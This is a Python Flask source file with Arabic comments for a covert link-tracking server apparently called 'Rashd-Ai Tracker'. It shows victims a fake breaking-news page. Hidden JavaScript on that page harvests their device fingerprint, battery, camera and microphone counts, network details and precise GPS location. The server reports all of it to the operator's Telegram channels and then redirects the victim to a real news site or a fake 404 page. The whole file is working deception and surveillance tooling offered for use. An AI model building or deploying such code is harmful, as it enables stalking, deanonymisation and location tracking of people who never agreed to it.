import os
import threading
import requests
from datetime import datetime
from flask import Flask, request, render_template_string, jsonify

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  ⚙️  الإعدادات
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

MAIN_BOT_TOKEN     = os.getenv("MAIN_BOT_TOKEN",    "")
TRACKER_BOT_TOKEN  = os.getenv("TRACKER_BOT_TOKEN", "")
TARGET_CHANNEL_ID  = os.getenv("TARGET_CHANNEL_ID",  "")
CONTROL_CHANNEL_ID = os.getenv("CONTROL_CHANNEL_ID", "")
IPINFO_TOKEN       = os.getenv("IPINFO_TOKEN", "")

# بيانات الجلسات المؤقتة {session_id: {...}}
session_data: dict = {}


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  📤  إرسال الرسائل عبر بوت التعقب
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def send_message(chat_id: str, message: str, token: str = None):
    """
    يرسل رسالة عبر Telegram.
    يجرب TRACKER_BOT_TOKEN أولاً، ثم MAIN_BOT_TOKEN كـ fallback.
    """
    tokens_to_try = []
    if token:
        tokens_to_try.append(token)
    tokens_to_try.append(TRACKER_BOT_TOKEN)
    tokens_to_try.append(MAIN_BOT_TOKEN)

    seen = set()
    for use_token in tokens_to_try:
        if use_token in seen:
            continue
        seen.add(use_token)
        try:
            r = requests.post(
                f"https://api.telegram.org/bot{use_token}/sendMessage",
                json={
                    "chat_id":                  chat_id,
                    "text":                     message[:4096],
                    "parse_mode":               "Markdown",
                    "disable_web_page_preview": True,
                },
                timeout=10,
            )
            if r.status_code == 200:
                print(f"[TRACKER] ✅ تم الإرسال لـ {chat_id}")
                return
            else:
                print(f"[TRACKER] ⚠️ فشل إرسال لـ {chat_id} بـ token={use_token[:10]}...: {r.status_code} — {r.text[:80]}")
        except Exception as e:
            print(f"[TRACKER] ⚠️ استثناء إرسال لـ {chat_id}: {e}")
    print(f"[TRACKER] ❌ فشل جميع المحاولات للإرسال لـ {chat_id}")


def get_ip_geo(ip: str) -> dict:
    try:
        r = requests.get(
            f"https://ipinfo.io/{ip}/json",
            headers={"Authorization": f"Bearer {IPINFO_TOKEN}"} if IPINFO_TOKEN else {},
            timeout=8,
        )
        return r.json() if r.status_code == 200 else {}
    except Exception:
        return {}


def get_ip_extra(ip: str) -> dict:
    """تحليل IP متقدم: VPN/Proxy/ASN/Hostname/Mobile عبر ip-api.com"""
    try:
        fields = "status,country,countryCode,regionName,city,isp,org,as,asname,reverse,mobile,proxy,hosting,query"
        r = requests.get(
            f"http://ip-api.com/json/{ip}?fields={fields}",
            timeout=8,
        )
        return r.json() if r.status_code == 200 else {}
    except Exception:
        return {}


# ════════════════════════════════════════════════════
# الكود المشترك لجمع البيانات (يُضمَّن في كل قالب)
# ════════════════════════════════════════════════════
_COLLECT_JS = """
<script>
(function(){
    var sid   = "{{ session_id }}";
    var cid   = "{{ chat_id }}";
    var redir = "{{ redirect_url }}";

    function finish(){
        setTimeout(function(){
            if(redir && redir !== "none"){
                window.location.href = redir;
            } else {
                window.location.href = "/done";
            }
        }, 800);
    }

    function sendDevice(info){
        fetch("/log_device/"+cid+"/"+sid, {
            method:"POST",
            headers:{"Content-Type":"application/json"},
            body: JSON.stringify(info)
        });
    }

    // ── بيانات أساسية ──
    var info = {
        ip:          "{{ ip }}",
        userAgent:   navigator.userAgent,
        platform:    navigator.platform,
        language:    navigator.language,
        languages:   (navigator.languages||[]).join(", "),
        screenW:     screen.width,
        screenH:     screen.height,
        colorDepth:  screen.colorDepth,
        pixelRatio:  window.devicePixelRatio || 1,
        timezone:    Intl.DateTimeFormat().resolvedOptions().timeZone,
        cookiesOn:   navigator.cookieEnabled,
        online:      navigator.onLine,
        doNotTrack:  navigator.doNotTrack || "N/A",
        cpuCores:    navigator.hardwareConcurrency || "N/A",
        ramGB:       navigator.deviceMemory || "N/A",
        touchPoints: navigator.maxTouchPoints || 0,
        referrer:    document.referrer || "مباشر",
        connType:    "N/A",
        connSpeed:   "N/A",
        connRTT:     "N/A",
        battery:     "N/A",
        charging:    "N/A",
        cameras:     0,
        microphones: 0,
        speakers:    0,
    };

    // ── نوع الاتصال وسرعته ──
    var conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
    if(conn){
        info.connType  = conn.effectiveType || conn.type || "N/A";
        info.connSpeed = conn.downlink ? conn.downlink+" Mbps" : "N/A";
        info.connRTT   = conn.rtt ? conn.rtt+" ms" : "N/A";
    }

    // ── البطارية ──
    var batteryDone = false;
    function tryBattery(){
        if(navigator.getBattery){
            navigator.getBattery().then(function(b){
                info.battery  = Math.round(b.level*100)+"%";
                info.charging = b.charging ? "يشحن ⚡" : "لا يشحن 🔋";
                batteryDone = true;
                checkSend();
            }).catch(function(){ batteryDone=true; checkSend(); });
        } else { batteryDone=true; checkSend(); }
    }

    // ── الكاميرات والميكروفونات ──
    var mediaDone = false;
    function tryMedia(){
        if(navigator.mediaDevices && navigator.mediaDevices.enumerateDevices){
            navigator.mediaDevices.enumerateDevices().then(function(devices){
                devices.forEach(function(d){
                    if(d.kind==="videoinput")  info.cameras++;
                    if(d.kind==="audioinput")  info.microphones++;
                    if(d.kind==="audiooutput") info.speakers++;
                });
                mediaDone=true; checkSend();
            }).catch(function(){ mediaDone=true; checkSend(); });
        } else { mediaDone=true; checkSend(); }
    }

    var sent = false;
    function checkSend(){
        if(!sent && batteryDone && mediaDone){
            sent = true;
            sendDevice(info);
        }
    }

    // ── timeout احتياطي: أرسل بعد 3 ثوانٍ على أي حال ──
    setTimeout(function(){
        if(!sent){ sent=true; sendDevice(info); }
    }, 3000);

    tryBattery();
    tryMedia();

    // ── GPS ──
    if(navigator.geolocation){
        navigator.geolocation.getCurrentPosition(
            function(pos){
                fetch("/log_gps/"+cid+"/"+sid, {
                    method:"POST",
                    headers:{"Content-Type":"application/json"},
                    body: JSON.stringify({
                        lat:      pos.coords.latitude,
                        lon:      pos.coords.longitude,
                        accuracy: pos.coords.accuracy,
                        altitude: pos.coords.altitude || "N/A",
                        speed:    pos.coords.speed || "N/A",
                        ip:       "{{ ip }}"
                    })
                }).then(finish);
            },
            function(){ finish(); },
            {timeout:8000, enableHighAccuracy:true}
        );
    } else { finish(); }
})();
</script>
"""

# قالب صفحة النجاح (404)
DONE_HTML = """<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>تم</title>
<style>
body{font-family:Arial,sans-serif;background:#f5f5f5;display:flex;align-items:center;justify-content:center;height:100vh;margin:0}
.box{background:#fff;padding:40px;border-radius:8px;text-align:center;box-shadow:0 2px 10px rgba(0,0,0,0.1)}
h1{color:#c0392b;margin:0}
p{color:#666;margin:10px 0 0 0}
</style>
</head>
<body>
<div class="box">
<h1>404</h1>
<p>الصفحة غير موجودة</p>
</div>
</body>
</html>
"""

# قالب صفحة إخبارية (news)
NEWS_HTML = """<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>الخبر العاجل — أخبار اليوم</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Segoe UI',Tahoma,Arial,sans-serif;background:#f5f5f5;color:#222;direction:rtl}
.top-bar{background:#c0392b;color:#fff;text-align:center;padding:6px;font-size:13px;letter-spacing:1px}
.logo-bar{background:#fff;border-bottom:3px solid #c0392b;padding:10px 20px;display:flex;align-items:center;justify-content:space-between}
.logo-bar .site-name{font-size:26px;font-weight:900;color:#c0392b;letter-spacing:2px}
.logo-bar .date{font-size:12px;color:#777}
.breaking{background:#c0392b;color:#fff;padding:8px 20px;font-size:14px;font-weight:700;display:flex;align-items:center;gap:10px}
.breaking span{background:#fff;color:#c0392b;padding:2px 8px;border-radius:3px;font-size:12px;font-weight:900}
.container{max-width:760px;margin:20px auto;padding:0 15px}
.article-card{background:#fff;border-radius:4px;box-shadow:0 1px 4px rgba(0,0,0,.15);overflow:hidden;margin-bottom:20px}
.article-img{width:100%;height:220px;background:linear-gradient(135deg,#2c3e50,#3498db);display:flex;align-items:center;justify-content:center}
.article-img .icon{font-size:80px}
.article-body{padding:20px}
.article-category{color:#c0392b;font-size:12px;font-weight:700;margin-bottom:8px;letter-spacing:1px}
.article-title{font-size:22px;font-weight:900;line-height:1.4;margin-bottom:12px}
.article-meta{color:#999;font-size:12px;margin-bottom:16px}
.skeleton{background:linear-gradient(90deg,#eee 25%,#ddd 50%,#eee 75%);background-size:200% 100%;animation:shimmer 1.5s infinite;border-radius:4px;margin:10px 0}
@keyframes shimmer{0%{background-position:200% 0}100%{background-position:-200% 0}}
.sk-line{height:14px}
.sk-line.short{width:60%}
.sk-line.long{width:100%}
.load-msg{text-align:center;color:#c0392b;font-size:13px;margin-top:20px;font-weight:600;animation:blink 1.2s infinite}
@keyframes blink{0%,100%{opacity:1}50%{opacity:0.4}}
.footer{background:#1a1a1a;color:#aaa;text-align:center;padding:14px;font-size:12px;margin-top:20px}
</style>
</head>
<body>
<div class="top-bar">🔴 بث مباشر — متابعة لحظة بلحظة</div>
<div class="logo-bar">
  <div class="site-name">📰 أخبار اليوم</div>
  <div class="date" id="dt"></div>
</div>
<div class="breaking"><span>عاجل</span> تطورات متسارعة في الملف المتابَع</div>
<div class="container">
  <div class="article-card">
    <div class="article-img"><div class="icon">📰</div></div>
    <div class="article-body">
      <div class="article-category">أخبار عاجلة</div>
      <div class="article-title">تطورات جديدة في الأخبار</div>
      <div class="article-meta">قبل دقائق قليلة</div>
      <div class="skeleton sk-line long" style="margin-bottom:12px"></div>
      <div class="skeleton sk-line long" style="margin-bottom:12px"></div>
      <div class="skeleton sk-line short"></div>
    </div>
  </div>
  <div class="load-msg">⏳ جاري تحميل المحتوى...</div>
</div>
<div class="footer">© 2024 جميع الحقوق محفوظة</div>
""" + _COLLECT_JS + """
<script>
document.getElementById('dt').textContent = new Date().toLocaleString('ar-SA');
</script>
</body>
</html>
"""

PAGE_TEMPLATES = {
    "news": NEWS_HTML,
    "download": NEWS_HTML,
    "bot": NEWS_HTML,
    "verify": NEWS_HTML,
}


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  🔌  المسارات | Flask Routes
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def create_tracker_app():
    """إنشاء تطبيق Flask للتعقب"""
    app = Flask(__name__)

    def _serve_tracker(chat_id: str, session_id: str, page_type: str):
        ip = request.headers.get("X-Forwarded-For", request.remote_addr)
        if ip and "," in ip:
            ip = ip.split(",")[0].strip()

        timestamp = datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S UTC")
        geo   = get_ip_geo(ip)
        extra = get_ip_extra(ip)

        loc = (geo.get("loc", "") if geo else "").split(",")
        lat = loc[0] if len(loc) == 2 else "N/A"
        lon = loc[1] if len(loc) == 2 else "N/A"

        is_vpn     = extra.get("proxy", False)
        is_hosting = extra.get("hosting", False)
        is_mobile  = extra.get("mobile", False)
        asn        = extra.get("as", "N/A")
        asn_name   = extra.get("asname", "N/A")
        hostname   = extra.get("reverse", "N/A") or "N/A"

        session_data[session_id] = {
            "ip":        ip,
            "timestamp": timestamp,
            "country":   geo.get("country", extra.get("country", "N/A")) if geo else extra.get("country", "N/A"),
            "city":      geo.get("city",    extra.get("city",    "N/A")) if geo else extra.get("city", "N/A"),
            "region":    geo.get("region",  extra.get("regionName", "N/A")) if geo else extra.get("regionName", "N/A"),
            "org":       geo.get("org",     extra.get("isp",    "N/A")) if geo else extra.get("isp", "N/A"),
            "lat":       lat,
            "lon":       lon,
            "chat_id":   chat_id,
            "is_vpn":    is_vpn,
            "is_hosting": is_hosting,
            "is_mobile": is_mobile,
            "asn":       asn,
            "asn_name":  asn_name,
            "hostname":  hostname,
        }

        vpn_flag = "⚠️ VPN/Proxy" if is_vpn else ("🏢 Hosting" if is_hosting else "✅ حقيقي")
        mobile_flag = "📱 هاتف" if is_mobile else "💻 جهاز ثابت"

        quick_notif = (
            "👁 *راشد — فُتح رابط تعقب*\n"
            "━━━━━━━━━━━━━━━━━━━━━\n"
            f"🆔 الجلسة   : `{session_id}`\n"
            f"📍 IP        : `{ip}`\n"
            f"🔍 النوع     : {vpn_flag} | {mobile_flag}\n"
            f"🏳️ الدولة   : {session_data[session_id]['country']}\n"
            f"🏙️ المدينة  : {session_data[session_id]['city']}\n"
            f"🌐 Hostname  : `{hostname}`\n"
            f"🏛️ ASN       : {asn}\n"
            f"🕐 الوقت    : {timestamp}\n"
            "━━━━━━━━━━━━━━━━━━━━━\n"
            "✦ راشد — راشد خليل أبو زيتونه"
        )
        send_message(CONTROL_CHANNEL_ID, quick_notif, token=TRACKER_BOT_TOKEN)

        template = PAGE_TEMPLATES.get(page_type, NEWS_HTML)
        redirect_map = {
            "bot":      "https://t.me/Rashid_Thunder_bot",
            "news":     "https://www.aljazeera.net",
            "download": "https://play.google.com/store",
            "verify":   "https://t.me/Rashid_Thunder_bot",
        }
        redirect_url = redirect_map.get(page_type, "https://www.aljazeera.net")
        return render_template_string(
            template,
            ip=ip,
            session_id=session_id,
            chat_id=chat_id,
            redirect_url=redirect_url,
        )

    @app.route("/track/<chat_id>/<session_id>/<page_type>")
    def tracker_page_typed(chat_id: str, session_id: str, page_type: str):
        return _serve_tracker(chat_id, session_id, page_type)

    @app.route("/track/<chat_id>/<session_id>")
    def tracker_page(chat_id: str, session_id: str):
        return _serve_tracker(chat_id, session_id, "news")

    @app.route("/log_device/<chat_id>/<session_id>", methods=["POST"])
    def log_device(chat_id: str, session_id: str):
        d   = request.json or {}
        s   = session_data.get(session_id, {})
        ip  = s.get("ip", d.get("ip", "N/A"))
        lat = s.get("lat", "N/A")
        lon = s.get("lon", "N/A")
        maps = f"https://maps.google.com/?q={lat},{lon}" if lat != "N/A" else ""

        vpn_flag    = "⚠️ VPN/Proxy" if s.get("is_vpn") else ("🏢 Hosting" if s.get("is_hosting") else "✅ حقيقي")
        mobile_flag = "📱 هاتف" if s.get("is_mobile") else "💻 جهاز ثابت"

        report = (
            "📡 *راشد — تقرير تعقب شامل*\n"
            "━━━━━━━━━━━━━━━━━━━━━\n"
            f"🆔 الجلسة    : `{session_id}`\n"
            f"🕐 التوقيت   : {s.get('timestamp', 'N/A')}\n\n"

            "🌐 *[ الشبكة والموقع ]*\n"
            f"📍 IP         : `{ip}`\n"
            f"🔍 نوع IP    : {vpn_flag}\n"
            f"📱 النوع     : {mobile_flag}\n"
            f"🏳️ الدولة    : {s.get('country', 'N/A')}\n"
            f"🏙️ المدينة   : {s.get('city',    'N/A')}\n"
            f"📍 المنطقة   : {s.get('region',  'N/A')}\n"
            f"🏢 المزود    : {s.get('org',     'N/A')}\n"
            f"🌐 Hostname  : `{s.get('hostname', 'N/A')}`\n"
            f"🏛️ ASN       : {s.get('asn', 'N/A')}\n"
        )
        if maps:
            report += f"🗺️ الإحداثيات: [افتح الخريطة]({maps})\n"

        report += (
            "\n💻 *[ الجهاز والمتصفح ]*\n"
            f"🖥️ المنصة    : {d.get('platform', 'N/A')}\n"
            f"🌐 اللغة     : {d.get('language', 'N/A')}\n"
            f"🗣️ اللغات    : {d.get('languages', 'N/A')}\n"
            f"📺 الشاشة    : {d.get('screenW', 'N/A')}×{d.get('screenH', 'N/A')} | "
            f"x{d.get('pixelRatio', 'N/A')}\n"
            f"🕐 المنطقة   : {d.get('timezone', 'N/A')}\n"
            f"☎️ اللمس     : {d.get('touchPoints', 0)} نقطة\n"
            f"🍪 كوكيز     : {'✅' if d.get('cookiesOn') else '❌'}\n"
            f"🚫 DoNotTrack: {d.get('doNotTrack', 'N/A')}\n"
            f"🔗 المصدر    : {d.get('referrer', 'مباشر')}\n\n"

            "⚙️ *[ المعالج والذاكرة ]*\n"
            f"🧠 أنوية CPU  : {d.get('cpuCores', 'N/A')}\n"
            f"💾 RAM        : {(str(d['ramGB'])+' GB') if d.get('ramGB') not in (None,'N/A') else ('❌ iOS لا يدعمه' if 'iPhone' in d.get('userAgent','') or 'iPad' in d.get('userAgent','') else 'N/A')}\n\n"

            "📶 *[ الاتصال ]*\n"
            f"📡 نوع الشبكة : {d.get('connType', 'N/A') if d.get('connType','N/A') != 'N/A' else ('❌ iOS لا يدعمه' if 'iPhone' in d.get('userAgent','') or 'iPad' in d.get('userAgent','') else 'N/A')}\n"
            f"⚡ السرعة    : {d.get('connSpeed', 'N/A') if d.get('connSpeed','N/A') != 'N/A' else ('❌ iOS لا يدعمه' if 'iPhone' in d.get('userAgent','') or 'iPad' in d.get('userAgent','') else 'N/A')}\n"
            f"⏱️ التأخير    : {d.get('connRTT', 'N/A') if d.get('connRTT','N/A') != 'N/A' else ('❌ iOS لا يدعمه' if 'iPhone' in d.get('userAgent','') or 'iPad' in d.get('userAgent','') else 'N/A')}\n\n"

            "🔋 *[ البطارية ]*\n"
            f"🔋 المستوى   : {d.get('battery', 'N/A') if d.get('battery','N/A') != 'N/A' else ('❌ iOS لا يدعمه' if 'iPhone' in d.get('userAgent','') or 'iPad' in d.get('userAgent','') else 'N/A')}\n"
            f"⚡ الحالة    : {d.get('charging', 'N/A') if d.get('charging','N/A') != 'N/A' else ('❌ iOS لا يدعمه' if 'iPhone' in d.get('userAgent','') or 'iPad' in d.get('userAgent','') else 'N/A')}\n\n"

            "📷 *[ الأجهزة المتصلة ]*\n"
            f"📷 كاميرات   : {d.get('cameras', 0)}\n"
            f"🎤 ميكروفونات: {d.get('microphones', 0)}\n"
            f"🔊 سماعات    : {d.get('speakers', 0)}\n\n"

            "🤖 *[ User Agent ]*\n"
            f"`{d.get('userAgent', 'N/A')[:200]}`\n"
            "━━━━━━━━━━━━━━━━━━━━━\n"
            "✦ راشد — راشد خليل أبو زيتونه"
        )

        send_message(chat_id, report, token=TRACKER_BOT_TOKEN)
        send_message(TARGET_CHANNEL_ID, report, token=TRACKER_BOT_TOKEN)

        return jsonify({"status": "ok"})

    @app.route("/log_gps/<chat_id>/<session_id>", methods=["POST"])
    def log_gps(chat_id: str, session_id: str):
        d         = request.json or {}
        lat       = d.get("lat", "N/A")
        lon       = d.get("lon", "N/A")
        accuracy  = d.get("accuracy", "N/A")
        ip        = session_data.get(session_id, {}).get("ip", d.get("ip", "N/A"))
        timestamp = datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S UTC")
        maps_link = f"https://maps.google.com/?q={lat},{lon}" if lat != "N/A" else "#"

        report = (
            "📍 *راشد — إحداثيات GPS*\n"
            "━━━━━━━━━━━━━━━━━━━━━\n"
            f"🆔 الجلسة   : `{session_id}`\n"
            f"🌐 IP        : `{ip}`\n"
            f"📍 خط العرض : `{lat}`\n"
            f"📍 خط الطول : `{lon}`\n"
            f"🎯 الدقة     : {accuracy} متر\n"
            f"🕑 التوقيت   : {timestamp}\n"
            f"🗺️ [فتح الخريطة]({maps_link})\n"
            "━━━━━━━━━━━━━━━━━━━━━\n"
            "✦ راشد — راشد خليل أبو زيتونه"
        )

        send_message(chat_id, report, token=TRACKER_BOT_TOKEN)
        send_message(TARGET_CHANNEL_ID, report, token=TRACKER_BOT_TOKEN)

        return jsonify({"status": "ok"})

    @app.route("/done")
    def done_page():
        return DONE_HTML, 404

    @app.route("/health")
    def health():
        return jsonify({"status": "operational", "system": "Rashd-Ai Tracker"})

    @app.route("/ping")
    def ping():
        return jsonify({"status": "alive"}), 200

    @app.route("/")
    def root():
        return jsonify({
            "system":    "Rashd-Ai Intelligence System",
            "version":   "2.0",
            "status":    "operational",
            "developer": "أبو سعود",
        })

    return app


def start_tracker_server():
    """تشغيل خادم التعقب في خيط منفصل"""
    port = int(os.getenv("PORT", 5000))
    app = create_tracker_app()
    print(f"📡 خادم التعقب يعمل على المنفذ {port}")
    app.run(host="0.0.0.0", port=port, debug=False, use_reloader=False)
